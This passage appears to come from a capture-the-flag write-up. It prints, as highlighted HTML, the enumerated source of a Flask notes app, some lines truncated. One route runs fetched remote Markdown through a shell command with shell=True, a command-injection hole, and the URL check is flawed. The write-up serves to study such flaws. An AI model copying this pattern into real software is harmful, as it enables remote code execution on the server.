                                                                  <span class="o">&gt;</span>  @app.route<span class="o">(</span><span class="s1">'/export_note_remote'</span>, <span class="nv">methods</span><span class="o">=[</span><span class="s1">'POST'</span><span class="o">])</span>
                                                                  <span class="o">&gt;</span>  @is_logged_in
                                                                  <span class="o">&gt;</span>  def export_note_remote<span class="o">()</span>:
                                                                  <span class="o">&gt;</span>      <span class="k">if </span>check_VIP<span class="o">(</span>session[<span class="s1">'username'</span><span class="o">])</span>:
                                                                  <span class="o">&gt;</span>          try:
                                                                  <span class="o">&gt;</span>              url <span class="o">=</span> request.form[<span class="s1">'url'</span><span class="o">]</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>              status, error <span class="o">=</span> parse_url<span class="o">(</span>url<span class="o">)</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>              <span class="k">if</span> <span class="o">(</span>status is True<span class="o">)</span> and <span class="o">(</span>error is None<span class="o">)</span>:
                                                                  <span class="o">&gt;</span>                  try:
                                                                  <span class="o">&gt;</span>                      r <span class="o">=</span> pyrequest.get<span class="o">(</span>url,allow_redirects<span class="o">=</span>True<span class="o">)</span>
                                                                  <span class="o">&gt;</span>                      rand_int <span class="o">=</span> random.randint<span class="o">(</span>1,10000<span class="o">)</span>
                                                                  <span class="o">&gt;</span>                      <span class="nb">command</span> <span class="o">=</span> f<span class="s2">"node misc/md-to-pdf.js  </span><span class="nv">$'</span><span class="s2">{r.te
                                                                  &gt;                      subprocess.run(command, shell=True, executa
                                                                  &gt;
                                                                  &gt;                      if os.path.isfile(attachment_dir + f'{str(r
                                                                  &gt;
                                                                  &gt;                          return send_file(attachment_dir + f'{st
                                                                  &gt;
                                                                  &gt;                      else:
                                                                  &gt;                          return render_template('export_note.htm
                                                                  &gt;
                                                                  &gt;                  except Exception as e:
                                                                  &gt;                      return render_template('export_note.html',
                                                                  &gt;
                                                                  &gt;
                                                                  &gt;              else:
                                                                  &gt;                  return render_template('export_note.html', erro
                                                                  &gt;
                                                                  &gt;          except Exception as e:
                                                                  &gt;              return render_template('export_note.html', error=f"</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>      <span class="k">else</span>:
                                                                  <span class="o">&gt;</span>          abort<span class="o">(</span>403<span class="o">)</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>  <span class="c"># Import notes</span>
                                                                  <span class="o">&gt;</span>  @app.route<span class="o">(</span><span class="s1">'/import_note'</span>, <span class="nv">methods</span><span class="o">=[</span><span class="s1">'GET'</span>, <span class="s1">'POST'</span><span class="o">])</span>
                                                                  <span class="o">&gt;</span>  @is_logged_in
                                                                  <span class="o">&gt;</span>  def import_note<span class="o">()</span>:
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>      <span class="k">if </span>check_VIP<span class="o">(</span>session[<span class="s1">'username'</span><span class="o">])</span>:
                                                                  <span class="o">&gt;</span>          <span class="k">if </span>request.method <span class="o">==</span> <span class="s1">'GET'</span>:
                                                                  <span class="o">&gt;</span>              <span class="k">return </span>render_template<span class="o">(</span><span class="s1">'import_note.html'</span><span class="o">)</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>          <span class="k">elif </span>request.method <span class="o">==</span> <span class="s2">"POST"</span>:
                                                                  <span class="o">&gt;</span>              title <span class="o">=</span> request.form[<span class="s1">'title'</span><span class="o">]</span>
                                                                  <span class="o">&gt;</span>              url <span class="o">=</span> request.form[<span class="s1">'url'</span><span class="o">]</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>              status, error <span class="o">=</span> parse_url<span class="o">(</span>url<span class="o">)</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>              <span class="k">if</span> <span class="o">(</span>status is True<span class="o">)</span> and <span class="o">(</span>error is None<span class="o">)</span>:
                                                                  <span class="o">&gt;</span>                  try:
                                                                  <span class="o">&gt;</span>                      r <span class="o">=</span> pyrequest.get<span class="o">(</span>url,allow_redirects<span class="o">=</span>True<span class="o">)</span>
                                                                  <span class="o">&gt;</span>                      md <span class="o">=</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span>.join<span class="o">(</span>r.text.split<span class="o">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">)[</span>:]<span class="o">)</span>
                                                                  <span class="o">&gt;</span>
                                                                  <span class="o">&gt;</span>                      body <span class="o">=</span> markdown.markdown<span class="o">(</span>md<span class="o">)</span>
                                                                  <span class="o">&gt;</span>                      cur <span class="o">=</span> mysql.connection.cursor<span class="o">()</span>
                                                                  <span class="o">&gt;</span>                      cur.execute<span class="o">(</span><span class="s2">"INSERT INTO notes(title, body,
                                                                  &gt;                      mysql.connection.commit()
                                                                  &gt;                      cur.close()
                                                                  &gt;
                                                                  &gt;                      return render_template('import_note.html',
                                                                  &gt;
                                                                  &gt;
                                                                  &gt;                  except Exception as e:
                                                                  &gt;                      return render_template('import_note.html',
                                                                  &gt;
                                                                  &gt;              else:
                                                                  &gt;                  return render_template('import_note.html', erro
                                                                  &gt;
                                                                  &gt;      else:
                                                                  &gt;          abort(403)
                                                                  &gt;
</span></code></pre></div>    </div>
  </li>
  <li>
    <p>Enumerated <strong>app.py</strong></p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1">#!/usr/bin/python3
</span>  <span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">flash</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">abort</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">logging</span><span class="p">,</span> <span class="n">send_file</span>
  <span class="kn">from</span> <span class="nn">flask_mysqldb</span> <span class="kn">import</span> <span class="n">MySQL</span>
  <span class="kn">from</span> <span class="nn">wtforms</span> <span class="kn">import</span> <span class="n">Form</span><span class="p">,</span> <span class="n">StringField</span><span class="p">,</span> <span class="n">TextAreaField</span><span class="p">,</span> <span class="n">PasswordField</span><span class="p">,</span> <span class="n">validators</span>
  <span class="kn">from</span> <span class="nn">passlib.hash</span> <span class="kn">import</span> <span class="n">sha256_crypt</span>
  <span class="kn">from</span> <span class="nn">functools</span> <span class="kn">import</span> <span class="n">wraps</span>
  <span class="kn">import</span> <span class="nn">time</span>
  <span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">pyrequest</span>
  <span class="kn">from</span> <span class="nn">html2text</span> <span class="kn">import</span> <span class="n">html2text</span>
  <span class="kn">import</span> <span class="nn">markdown</span>
  <span class="kn">import</span> <span class="nn">random</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">subprocess</span>
    
  <span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
    
  <span class="c1"># Config MySQL
</span>  <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'MYSQL_HOST'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'localhost'</span>
  <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'MYSQL_USER'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'DB_user'</span>
  <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'MYSQL_PASSWORD'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'DB_password'</span>
  <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'MYSQL_DB'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'app'</span>
  <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'MYSQL_CURSORCLASS'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'DictCursor'</span>
    
  <span class="n">attachment_dir</span> <span class="o">=</span> <span class="s">'misc/attachments/'</span>
    
  <span class="c1"># init MYSQL
</span>  <span class="n">mysql</span> <span class="o">=</span> <span class="n">MySQL</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
    
  <span class="c1"># Index
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
  <span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
      <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'home.html'</span><span class="p">)</span>
    
  <span class="c1"># About
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/about'</span><span class="p">)</span>
  <span class="k">def</span> <span class="nf">about</span><span class="p">():</span>
      <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'about.html'</span><span class="p">)</span>
    
  <span class="c1"># Check if user logged in
</span>  <span class="k">def</span> <span class="nf">is_logged_in</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
      <span class="o">@</span><span class="n">wraps</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
      <span class="k">def</span> <span class="nf">wrap</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
          <span class="k">if</span> <span class="s">'logged_in'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
              <span class="k">return</span> <span class="n">f</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
          <span class="k">else</span><span class="p">:</span>
              <span class="n">flash</span><span class="p">(</span><span class="s">'Unauthorized, Please login'</span><span class="p">,</span> <span class="s">'danger'</span><span class="p">)</span>
              <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">'login'</span><span class="p">))</span>
      <span class="k">return</span> <span class="n">wrap</span>
    
  <span class="c1"># notes
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/notes'</span><span class="p">)</span>
  <span class="o">@</span><span class="n">is_logged_in</span>
  <span class="k">def</span> <span class="nf">notes</span><span class="p">():</span>
      <span class="c1"># Create cursor
</span>      <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
      <span class="c1"># Get notes
</span>      <span class="k">if</span> <span class="n">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]):</span>
          <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM notes where author= (%s or 'Noter Team')"</span><span class="p">,[</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]])</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM notes where author= %s"</span><span class="p">,[</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]])</span>
    
      <span class="n">notes</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
    
      <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
          <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'notes.html'</span><span class="p">,</span> <span class="n">notes</span><span class="o">=</span><span class="n">notes</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="n">msg</span> <span class="o">=</span> <span class="s">'No notes Found'</span>
          <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'notes.html'</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>
      <span class="c1"># Close connection
</span>      <span class="n">cur</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    
  <span class="c1">#Single note
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/note/&lt;string:id&gt;/'</span><span class="p">)</span>
  <span class="o">@</span><span class="n">is_logged_in</span>
  <span class="k">def</span> <span class="nf">note</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
      <span class="c1"># Create cursor
</span>      <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    
      <span class="c1"># Get notes
</span>      <span class="k">if</span> <span class="n">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]):</span>
          <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM notes where author= (%s or 'Noter Team') and id = %s"</span><span class="p">,(</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">],</span> <span class="nb">id</span><span class="p">))</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM notes where author= %s"</span><span class="p">,[</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]])</span>
    
      <span class="n">note</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">fetchone</span><span class="p">()</span>
      <span class="n">note</span><span class="p">[</span><span class="s">'body'</span><span class="p">]</span> <span class="o">=</span> <span class="n">html2text</span><span class="p">(</span><span class="n">note</span><span class="p">[</span><span class="s">'body'</span><span class="p">])</span>
      <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'note.html'</span><span class="p">,</span> <span class="n">note</span><span class="o">=</span><span class="n">note</span><span class="p">)</span>
    
  <span class="c1"># Register Form Class
</span>  <span class="k">class</span> <span class="nc">RegisterForm</span><span class="p">(</span><span class="n">Form</span><span class="p">):</span>
      <span class="n">name</span> <span class="o">=</span> <span class="n">StringField</span><span class="p">(</span><span class="s">'Name'</span><span class="p">,</span> <span class="p">[</span><span class="n">validators</span><span class="p">.</span><span class="n">Length</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="nb">max</span><span class="o">=</span><span class="mi">50</span><span class="p">)])</span>
      <span class="n">username</span> <span class="o">=</span> <span class="n">StringField</span><span class="p">(</span><span class="s">'Username'</span><span class="p">,</span> <span class="p">[</span><span class="n">validators</span><span class="p">.</span><span class="n">Length</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="nb">max</span><span class="o">=</span><span class="mi">25</span><span class="p">)])</span>
      <span class="n">email</span> <span class="o">=</span> <span class="n">StringField</span><span class="p">(</span><span class="s">'Email'</span><span class="p">,</span> <span class="p">[</span><span class="n">validators</span><span class="p">.</span><span class="n">Length</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span> <span class="nb">max</span><span class="o">=</span><span class="mi">50</span><span class="p">)])</span>
      <span class="n">password</span> <span class="o">=</span> <span class="n">PasswordField</span><span class="p">(</span><span class="s">'Password'</span><span class="p">,</span> <span class="p">[</span>
          <span class="n">validators</span><span class="p">.</span><span class="n">DataRequired</span><span class="p">(),</span>
          <span class="n">validators</span><span class="p">.</span><span class="n">EqualTo</span><span class="p">(</span><span class="s">'confirm'</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s">'Passwords do not match'</span><span class="p">)</span>
      <span class="p">])</span>
      <span class="n">confirm</span> <span class="o">=</span> <span class="n">PasswordField</span><span class="p">(</span><span class="s">'Confirm Password'</span><span class="p">)</span>
    
  <span class="c1"># User Register
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/register'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
  <span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
      <span class="n">form</span> <span class="o">=</span> <span class="n">RegisterForm</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">)</span>
      <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span> <span class="ow">and</span> <span class="n">form</span><span class="p">.</span><span class="n">validate</span><span class="p">():</span>
          <span class="n">name</span> <span class="o">=</span> <span class="n">form</span><span class="p">.</span><span class="n">name</span><span class="p">.</span><span class="n">data</span>
          <span class="n">email</span> <span class="o">=</span> <span class="n">form</span><span class="p">.</span><span class="n">email</span><span class="p">.</span><span class="n">data</span>
          <span class="n">username</span> <span class="o">=</span> <span class="n">form</span><span class="p">.</span><span class="n">username</span><span class="p">.</span><span class="n">data</span>
          <span class="n">password</span> <span class="o">=</span> <span class="n">sha256_crypt</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">form</span><span class="p">.</span><span class="n">password</span><span class="p">.</span><span class="n">data</span><span class="p">))</span>
    
          <span class="c1"># Create cursor
</span>          <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    
          <span class="c1"># Execute query
</span>          <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"INSERT INTO users(name, email, username, password) VALUES(%s, %s, %s, %s)"</span><span class="p">,</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>
    
          <span class="c1"># Commit to DB
</span>          <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>
    
          <span class="c1"># Close connection
</span>          <span class="n">cur</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    
          <span class="n">flash</span><span class="p">(</span><span class="s">'You are now registered and can log in'</span><span class="p">,</span> <span class="s">'success'</span><span class="p">)</span>
    
          <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">'login'</span><span class="p">))</span>
      <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'register.html'</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>
    
  <span class="c1"># User login
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/login'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
  <span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
      <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">:</span>
          <span class="c1"># Get Form Fields
</span>          <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span>
          <span class="n">password_candidate</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'password'</span><span class="p">]</span>
    
          <span class="c1"># Create cursor
</span>          <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    
          <span class="c1"># Get user by username
</span>          <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM users WHERE username = %s"</span><span class="p">,</span> <span class="p">([</span><span class="n">username</span><span class="p">]))</span>
    
          <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
              <span class="c1"># Get stored hash
</span>              <span class="n">data</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">fetchone</span><span class="p">()</span>
              <span class="n">password</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s">'password'</span><span class="p">]</span>
    
              <span class="c1"># Compare Passwords
</span>              <span class="k">if</span> <span class="n">sha256_crypt</span><span class="p">.</span><span class="n">verify</span><span class="p">(</span><span class="n">password_candidate</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
                  <span class="c1"># Passed
</span>                  <span class="n">session</span><span class="p">[</span><span class="s">'logged_in'</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
                  <span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
    
                  <span class="n">flash</span><span class="p">(</span><span class="s">'You are now logged in'</span><span class="p">,</span> <span class="s">'success'</span><span class="p">)</span>
                  <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">'dashboard'</span><span class="p">))</span>
              <span class="k">else</span><span class="p">:</span>
                  <span class="n">error</span> <span class="o">=</span> <span class="s">'Invalid login'</span>
                  <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'login.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
              <span class="c1"># Close connection
</span>              <span class="n">cur</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
          <span class="k">else</span><span class="p">:</span>
              <span class="n">error</span> <span class="o">=</span> <span class="s">'Invalid credentials'</span>
              <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'login.html'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
    
      <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'login.html'</span><span class="p">)</span>
    
  <span class="c1"># Logout
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/logout'</span><span class="p">)</span>
  <span class="o">@</span><span class="n">is_logged_in</span>
  <span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
      <span class="n">session</span><span class="p">.</span><span class="n">clear</span><span class="p">()</span>
      <span class="n">flash</span><span class="p">(</span><span class="s">'You are now logged out'</span><span class="p">,</span> <span class="s">'success'</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">'login'</span><span class="p">))</span>
    
  <span class="c1">#Check VIP
</span>  <span class="k">def</span> <span class="nf">check_VIP</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
      <span class="k">try</span><span class="p">:</span>
          <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
          <span class="n">results</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">""" select username, case when role = "VIP" then True else False end as VIP from users where username = %s """</span><span class="p">,</span> <span class="p">[</span><span class="n">username</span><span class="p">])</span>
    
          <span class="n">results</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">fetchone</span><span class="p">()</span>
          <span class="n">cur</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    
          <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">results</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
              <span class="k">if</span> <span class="n">results</span><span class="p">[</span><span class="s">'VIP'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                  <span class="k">return</span> <span class="bp">True</span>
    
          <span class="k">return</span> <span class="bp">False</span>
    
      <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
          <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'login.html'</span><span class="p">)</span>
    
  <span class="c1"># Dashboard
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/dashboard'</span><span class="p">)</span>
  <span class="o">@</span><span class="n">is_logged_in</span>
  <span class="k">def</span> <span class="nf">dashboard</span><span class="p">():</span>
    
      <span class="c1"># Create cursor
</span>      <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    
      <span class="c1"># Get notes
</span>      <span class="c1">#result = cur.execute("SELECT * FROM notes")
</span>      <span class="c1"># Show notes only from the user logged in 
</span>      <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM notes WHERE author = %s"</span><span class="p">,[</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]])</span>
    
      <span class="n">notes</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
      <span class="n">VIP</span> <span class="o">=</span> <span class="n">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">])</span>
    
      <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
          <span class="k">if</span> <span class="n">VIP</span><span class="p">:</span>
              <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'vip_dashboard.html'</span><span class="p">,</span> <span class="n">notes</span><span class="o">=</span><span class="n">notes</span><span class="p">)</span>
    
          <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'dashboard.html'</span><span class="p">,</span> <span class="n">notes</span><span class="o">=</span><span class="n">notes</span><span class="p">)</span>
        
      <span class="k">else</span><span class="p">:</span>
          <span class="n">msg</span> <span class="o">=</span> <span class="s">'No notes Found'</span>
    
          <span class="k">if</span> <span class="n">VIP</span><span class="p">:</span>
              <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'vip_dashboard.html'</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>
    
          <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'dashboard.html'</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>
      <span class="c1"># Close connection
</span>      <span class="n">cur</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    
  <span class="c1"># parse the URL
</span>  <span class="k">def</span> <span class="nf">parse_url</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
      <span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span>
      <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">.</span><span class="n">startswith</span> <span class="p">(</span><span class="s">"http://"</span> <span class="ow">or</span> <span class="s">"https://"</span><span class="p">):</span>
          <span class="k">return</span> <span class="bp">False</span><span class="p">,</span> <span class="s">"Invalid URL"</span>    
    
      <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">'.md'</span><span class="p">):</span>
              <span class="k">return</span> <span class="bp">False</span><span class="p">,</span> <span class="s">"Invalid file type"</span>
    
      <span class="k">return</span> <span class="bp">True</span><span class="p">,</span> <span class="bp">None</span>
    
  <span class="c1"># Export notes
</span>  <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/export_note'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
  <span class="o">@</span><span class="n">is_logged_in</span>
  <span class="k">def</span> <span class="nf">export_note</span><span class="p">():</span>
      <span class="k">if</span> <span class="n">check_VIP</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]):</span>
          <span class="k">try</span><span class="p">:</span>
              <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
    
              <span class="c1"># Get note
</span>              <span class="n">result</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT * FROM notes WHERE author = %s"</span><span class="p">,</span> <span class="p">([</span><span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]]))</span>
    
              <span class="n">notes</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
    
              <span class="k">if</span> <span class="n">result</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
                  <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">notes</span><span class="o">=</span><span class="n">notes</span><span class="p">)</span>
              <span class="k">else</span><span class="p">:</span>
                  <span class="n">msg</span> <span class="o">=</span> <span class="s">'No notes Found'</span>
                  <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'export_note.html'</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>
              <span class="c1"># Close connection
</span>              <span class="n">cur</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                    
